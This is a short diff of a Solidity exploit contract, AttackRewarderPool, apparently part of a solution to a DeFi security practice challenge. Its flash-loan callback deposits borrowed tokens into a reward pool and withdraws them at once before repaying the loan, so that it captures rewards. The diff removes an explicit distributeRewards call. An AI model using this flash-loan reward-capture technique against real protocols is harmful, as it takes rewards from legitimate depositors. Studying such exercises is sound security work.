@@ -138,7 +138,6 @@ contract AttackRewarderPool {
         console.log("Received Loan : ", amount);
         liquidityToken.approve(rewardPoolAddress, amount);
         rewardPool.deposit(amount);
-        rewardPool.distributeRewards();
         rewardPool.withdraw(amount);
         liquidityToken.transfer(lenderPoolAddress, amount);
     }
